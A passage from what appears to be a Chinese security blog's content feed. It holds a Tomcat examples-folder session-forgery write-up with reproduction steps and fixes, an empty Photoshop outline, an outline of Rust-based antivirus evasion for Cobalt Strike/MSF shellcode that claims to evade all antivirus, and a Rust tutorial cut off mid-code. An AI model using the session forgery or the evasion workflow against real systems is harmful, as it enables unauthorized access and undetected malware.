漏洞修复计划。</p></blockquote><p><strong>基本信息</strong></p><p>Tomcat样例（Example）泄露，下载Tomcat后在解压后的文件目录里有tomcat自带的webapp/docs和webapp/example文件夹，docs是tomcat的说明文档，example是tomcat自带的示例。</p><p>漏洞分析：docs是文档，所以基本不存在风险，但是examples里面有session，而tomcat的session是共享的，这使得在不需要任何权限的情况下，可以通过examples的session示例对tomcat中的session进行修改，这样的话可能会造成某人通过examples篡改session，从而获取管理员权限等问题。</p><p>修复计划：所以在使用tomcat部署应用的时候，建议先备份或者直接删掉webapp/docs和webapp/example文件夹。</p><p><strong>OTS</strong></p><ul><li>Tomcat</li><li>ALL version</li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><p><strong>分析</strong></p><p>表单部分代码，接收用户输入的Name和Value值</p><pre class=" language-js"><code class="language-js">out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;P>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;form action="</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">encodeURL</span><span class="token punctuation">(</span><span class="token string">"SessionExample"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">""</span> "<span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method=POST>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rb<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"sessions.dataname"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;input type=text size=20 name=dataname>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rb<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"sessions.datavalue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;input type=text size=20 name=datavalue>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;input type=submit>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/form>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>核心代码，将接收的用户输入的Name和Value值写入到Session中</p><pre class=" language-js"><code class="language-js">HttpSession session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rb<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"sessions.id"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span>session<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rb<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"sessions.created"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getCreationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rb<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"sessions.lastaccessed"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getLastAccessedTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>String dataName <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"dataname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取dataname参数的值</span>String dataValue <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"datavalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取datavalue参数的值</span><span class="token keyword">if</span> <span class="token punctuation">(</span>dataName <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> dataValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>dataName<span class="token punctuation">,</span> dataValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将dataname和datavalue写入session</span><span class="token punctuation">}</span></code></pre><p>用户通过表单提交Name和Value参数，然后通过request.getParameter（）函数获取这两个参数的值，再通过session.setAttribute() 函数将Name和Value的值写入Session中。</p><p><strong>复现</strong></p><p>/examples/servlets/servlet/SessionExample</p><p>在Name of Session Attribute: 里输入 login</p><p>在Value of Session Attribute:里输入 admin</p><p>提交后显示login=admin已经写入session</p><p><strong>验证</strong></p><p>首次打开因为没有Session被重定向到登入页面。</p><p>利用样例漏洞后，再次打开index.jsp，显示成功登录。</p><h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><p>删掉webapp/docs和webapp/example文件夹。</p><p>对目录进行访问限制</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IRF </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PhotoShop</title>
      <link href="posts/ba06.html"/>
      <url>posts/ba06.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-熟悉开始工作区"><a href="#Ax-熟悉开始工作区" class="headerlink" title="Ax 熟悉开始工作区"></a>Ax 熟悉开始工作区</h2><h3 id="开始工作区"><a href="#开始工作区" class="headerlink" title="开始工作区"></a>开始工作区</h3><h3 id="搜索栏"><a href="#搜索栏" class="headerlink" title="搜索栏"></a>搜索栏</h3><h3 id="主页屏幕"><a href="#主页屏幕" class="headerlink" title="主页屏幕"></a>主页屏幕</h3><h3 id="新建打开和打开按钮"><a href="#新建打开和打开按钮" class="headerlink" title="新建打开和打开按钮"></a>新建打开和打开按钮</h3><h3 id="控制文件数"><a href="#控制文件数" class="headerlink" title="控制文件数"></a>控制文件数</h3><h2 id="Bx-工作界面"><a href="#Bx-工作界面" class="headerlink" title="Bx  工作界面"></a>Bx  工作界面</h2><h3 id="工作界面的组成"><a href="#工作界面的组成" class="headerlink" title="工作界面的组成"></a>工作界面的组成</h3><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><h3 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h3><h3 id="工具选项栏"><a href="#工具选项栏" class="headerlink" title="工具选项栏"></a>工具选项栏</h3><h3 id="文档窗口"><a href="#文档窗口" class="headerlink" title="文档窗口"></a>文档窗口</h3><h3 id="状态栏"><a href="#状态栏" class="headerlink" title="状态栏"></a>状态栏</h3><h3 id="浮动面板"><a href="#浮动面板" class="headerlink" title="浮动面板"></a>浮动面板</h3><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><h2 id="Cx-工作区的设置"><a href="#Cx-工作区的设置" class="headerlink" title="Cx 工作区的设置"></a>Cx 工作区的设置</h2><h3 id="使用预设的工作区"><a href="#使用预设的工作区" class="headerlink" title="使用预设的工作区"></a>使用预设的工作区</h3><h3 id="创建自定义的工作区"><a href="#创建自定义的工作区" class="headerlink" title="创建自定义的工作区"></a>创建自定义的工作区</h3><h3 id="自定义工具快捷键"><a href="#自定义工具快捷键" class="headerlink" title="自定义工具快捷键"></a>自定义工具快捷键</h3><h3 id="自定义彩色菜单命令"><a href="#自定义彩色菜单命令" class="headerlink" title="自定义彩色菜单命令"></a>自定义彩色菜单命令</h3><h3 id="新功能锁定工作区"><a href="#新功能锁定工作区" class="headerlink" title="新功能锁定工作区"></a>新功能锁定工作区</h3><h2 id="Dx-图像的查看"><a href="#Dx-图像的查看" class="headerlink" title="Dx 图像的查看"></a>Dx 图像的查看</h2><h3 id="切换不同的屏幕模式"><a href="#切换不同的屏幕模式" class="headerlink" title="切换不同的屏幕模式"></a>切换不同的屏幕模式</h3><h3 id="文档窗口排列方式"><a href="#文档窗口排列方式" class="headerlink" title="文档窗口排列方式"></a>文档窗口排列方式</h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> PS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust进程注入免杀</title>
      <link href="posts/5bae.html"/>
      <url>posts/5bae.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Rust进程注入免杀"><a href="#Ax-Rust进程注入免杀" class="headerlink" title="Ax Rust进程注入免杀"></a>Ax Rust进程注入免杀</h2><p>暂时可以免杀一切杀软</p><h2 id="Bx-步骤"><a href="#Bx-步骤" class="headerlink" title="Bx 步骤"></a>Bx 步骤</h2><p>CS或MSF生成C#payload，将payload使用rust进行编码，如下代码</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20221021171904727.png"></p><p>使用<code>cargo run</code>执行，得到加密后的XOR shellcode和AES shellcode，将AES shellcode复制到shellcode执行器中编译exe。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20221021172142131.png"></p><p>编译该项目</p><pre class=" language-shell"><code class="language-shell">$ cargo build --release</code></pre><p><img src="https://lit.enomothem.com/zhixinghe/image-20221021172322357.png"></p><p>服务端</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20221021172805762.png"></p><p>客户端</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20221021172822955.png"></p><p>免杀效果</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20221021172834027.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> AntiVirus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> process </tag>
            
            <tag> rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust programming 3</title>
      <link href="posts/de6a.html"/>
      <url>posts/de6a.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Rust-Game"><a href="#Ax-Rust-Game" class="headerlink" title="Ax Rust Game"></a>Ax Rust Game</h2><p>让我们一起完成一个动手项目，进入 Rust！实践出真知。您将了解<code>let</code>, <code>match</code>, 方法、相关函数、使用外部 crate 等等！</p><p>我们将实现一个经典的初学者编程问题：猜谜游戏。它是这样工作的：程序将生成一个介于 1 和 100 之间的随机整数。然后它会提示玩家输入猜测。输入猜测值后，程序将指示猜测值是过低还是过高。如果猜对了，游戏将打印祝贺信息并退出。</p><h2 id="Bx-Create-Project"><a href="#Bx-Create-Project" class="headerlink" title="Bx Create Project"></a>Bx Create Project</h2><p>要建立一个新项目</p><pre class=" language-shell"><code class="language-shell">$ cargo new guessing_game$ cd guessing_game</code></pre><p>测试一下输出默认的hello world</p><pre class=" language-shell"><code class="language-shell">$ cargo run</code></pre><h2 id="Cx-Programming"><a href="#Cx-Programming" class="headerlink" title="Cx Programming"></a>Cx Programming</h2><h3 id="猜测处理机制"><a href="#猜测处理机制" class="headerlink" title="猜测处理机制"></a>猜测处理机制</h3><p>直接在默认生成的这个文件中编写</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">use</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>io<span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Guess the number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Please input your guess."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> guess <span class="token operator">=</span> String<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    io<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">read_line</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> guess<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read line"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You guessed: {guess}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>解析：</p><p>该<code>io</code>库来自标准库，称为<code>std</code>，所以需要引入。</p><p><code>fn</code>声明一个函数体，<code>main</code>函数是程序的入口。</p><p><code>println!</code>是一个将字符串打印到屏幕的宏。</p><h4 id="赋值到变量"><a href="#赋值到变量" class="headerlink" title="赋值到变量"></a>赋值到变量</h4><p>我们将创建一个<em>变量</em>来存储用户输入</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token keyword">mut</span> guess <span class="token operator">=</span> String<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用<code>let</code>语句来创建变量</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">let</span> apples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span></code></pre><p>这一行创建了一个名为 5 的新变量<code>apples</code>并将其绑定到值 5。在 Rust 中，变量默认是不可变的，添加<code>mut</code>使其可变。</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">let</span> apples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// immutable</span><span class="token keyword">let</span> <span class="token keyword">mut</span> bananas <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// mutable</span></code></pre><h4 id="接收用户输入"><a href="#接收用户输入" class="headerlink" title="接收用户输入"></a>接收用户输入</h4><p><code>use std::io;</code>，现在我们将从模块中调用该<code>stdin</code>函数<code>io</code>，这将允许我们处理用户输入。</p><pre class=" language-rust"><code class="language-rust">    io<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">read_line</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> guess<span class="token punctuation">)</span></code></pre><p>该行<code>.read_line(&amp;mut guess)</code>调用<code>read_line</code>标准输入句柄上的方法来获取用户的输入。用户输入的任何内容放入标准输入并将其附加到字符串中（不覆盖其内容），所以我们因此将该字符串作为参数传递。字符串参数需要是可变的，以便该方法可以更改字符串的内容。</p><p><code>&amp;</code>表示此参数是一个引用<em>，</em>它为您提供了一种方法，让您的代码的多个部分访问一个数据，而无需多次将该数据复制到内存中。引用是一个复杂的特性，Rust 的主要优势之一是使用引用是多么安全和容易。你不需要知道很多细节来完成这个程序。现在，您需要知道的是，与变量一样，引用在默认情况下是不可变的。因此，您需要编写<code>&amp;mut guess</code>而不是 <code>&amp;guess</code>使其可变。</p><h4 id="Result的潜在故障"><a href="#Result的潜在故障" class="headerlink" title="Result的潜在故障"></a>Result的潜在故障</h4><p>者是result的一个处理错误的机制。不要的话会报错（编译的时候，不影响运行）。</p><pre class=" language-rust"><code class="language-rust">        <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read line"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以写成一行</p><pre class=" language-rust"><code class="language-rust">io<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read_line</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> guess<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read line"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>具体就不说了。</p><h4 id="Println-使用占位符打印内容"><a href="#Println-使用占位符打印内容" class="headerlink" title="Println!使用占位符打印内容"></a>Println!使用占位符打印内容</h4><pre class=" language-rust"><code class="language-rust">    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You guessed: {guess}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>您可以使用花括号打印多个值，第一组花括号保存格式字符串后列出的第一个值，第二组保存第二个值，依此类推</p><p>例</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"x = {} and y = {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>此代码将打印<code>x = 5 and y = 10</code>.</p><h4 id="测试处理机制"><a href="#测试处理机制" class="headerlink" title="测试处理机制"></a>测试处理机制</h4><p>使用<code>cargo run</code></p><pre class=" language-rust"><code class="language-rust">$ cargo run           Finished dev <span class="token punctuation">[</span>unoptimized <span class="token operator">+</span> debuginfo<span class="token punctuation">]</span> <span class="token function">target</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">.</span>02s     Running `target<span class="token operator">/</span>debug<span class="token operator">/</span>guessing_game`Guess the <span class="token macro-rules function">number!</span>Please input your guess<span class="token punctuation">.</span><span class="token number">1</span>You guessed<span class="token punctuation">:</span> <span class="token number">1</span></code></pre><p>至此，游戏的第一部分就完成了：我们从键盘获取输入，然后打印出来。</p><h3 id="生成密码"><a href="#生成密码" class="headerlink" title="生成密码"></a>生成密码</h3><p>接下来，我们需要生成一个用户将尝试猜测的秘密数字。密码每次都应该不同，这样游戏就可以玩不止一次。我们将使用 1 到 100 之间的随机数，这样游戏不会太难。Rust 的标准库中还没有包含随机数功能。然而，Rust 团队确实提供具有上述功能的<code>rand</code>板条箱（crate）。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220727165714849.png"></p><h4 id="使用板条箱获得更多功能"><a href="#使用板条箱获得更多功能" class="headerlink" title="使用板条箱获得更多功能"></a>使用板条箱获得更多功能</h4><p>请记住，一个 crate 是 Rust 源代码文件的集合。我们一直在构建的项目是一个<em>二进制 crate</em>，它是一个可执行文件。<code>rand</code> crate 是一个<em>库 crate</em>，其中包含旨在用于其他程序且不能单独执行的代码。</p><p>Cargo 对外部 crate 的协调是 Cargo 真正发光的地方！</p><p>引入：我们需要修改<em>Cargo.toml</em>文件以包含<code>rand</code>crate 作为依赖项。请务必<code>rand</code>完全按照我们在此处指定的版本号使用此版本号，否则本教程中的代码示例可能无法正常工作。</p><p>现在打开该文件并将以下行添加到<code>[dependencies]</code>Cargo 为您创建的部分标题下方的底部</p><p>文件名：Cargo.toml</p><pre class=" language-toml"><code class="language-toml">rand = "0.8.3"</code></pre><p>不改动，则不会更新版本。</p><h4 id="使用Cargo-lock文件确保可重现的构建"><a href="#使用Cargo-lock文件确保可重现的构建" class="headerlink" title="使用Cargo.lock文件确保可重现的构建"></a>使用Cargo.lock文件确保可重现的构建</h4><p>cargo只会用你指定的版本，这个文件就是为了确保它。</p><h4 id="更新板条箱"><a href="#更新板条箱" class="headerlink" title="更新板条箱"></a>更新板条箱</h4><p>如果你想更新，可以使用下面的命令，它忽略lock文件并写入lock。</p><pre class=" language-rust"><code class="language-rust">$ cargo update    Updating crates<span class="token punctuation">.</span>io index    Updating rand v0<span class="token number">.8</span><span class="token punctuation">.</span><span class="token number">3</span> <span class="token punctuation">-></span> v0<span class="token number">.8</span><span class="token punctuation">.</span><span class="token number">4</span></code></pre><blockquote><p>如果有两个新版本，它不会更新到最新的，而是最近的一次更新，如需更新需要自己更改Cargo.toml。</p></blockquote><h4 id="生成随机数"><a href="#生成随机数" class="headerlink" title="生成随机数"></a>生成随机数</h4><p>让我们开始使用<code>rand</code>来生成一个数字来猜测</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">use</span> rand<span class="token punctuation">:</span><span class="token punctuation">:</span>Rng<span class="token punctuation">;</span>    <span class="token keyword">let</span> secret_number <span class="token operator">=</span> rand<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">thread_rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">gen_range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>不知道怎么用？Cargo 的另一个巧妙功能是运行该<code>cargo doc --open</code>命令将在本地构建所有依赖项提供的文档并在浏览器中打开它。</p></blockquote><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>现在我们有了用户输入和一个随机数，我们可以比较它们。</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">use</span> rand<span class="token punctuation">:</span><span class="token punctuation">:</span>Rng<span class="token punctuation">;</span><span class="token keyword">use</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>cmp<span class="token punctuation">:</span><span class="token punctuation">:</span>Ordering<span class="token punctuation">;</span><span class="token keyword">use</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>io<span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// --snip--</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You guessed: {guess}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">match</span> guess<span class="token punctuation">.</span><span class="token function">cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>secret_number<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Less <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Too small!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Greater <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Too big!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Equal <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You win!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>报错了，为什么？以为用户的输入是字符串，无法与数字进行对比。</p><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>咦，前面不是定义过了吗， 是的你没看过，RUST支持使用使用过的变量。使用该方法可以进行类型转换。</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">let</span> guess<span class="token punctuation">:</span> u32 <span class="token operator">=</span> guess<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Please type a number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="猜不中？继续猜！"><a href="#猜不中？继续猜！" class="headerlink" title="猜不中？继续猜！"></a>猜不中？继续猜！</h3><p>猜不中？我让你猜中为止，循环，欸。</p><pre class=" language-rust"><code class="language-rust">    <span class="token comment" spellcheck="true">// --snip--</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"The secret number is: {secret_number}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">loop</span> <span class="token punctuation">{</span>        <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Please input your guess."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// --snip--</span>        <span class="token keyword">match</span> guess<span class="token punctuation">.</span><span class="token function">cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>secret_number<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Less <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Too small!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Greater <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Too big!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Equal <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You win!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>等下，这猜中了也停不下来啊。优化一下，在猜中的那一条中加入break退出程序</p><pre class=" language-rust"><code class="language-rust">Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Equal <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>处理一下无效的错误输入，不至于输入一个别的东西就让程序崩溃了。</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">let</span> guess<span class="token punctuation">:</span> u32 <span class="token operator">=</span> <span class="token keyword">match</span> guess<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span 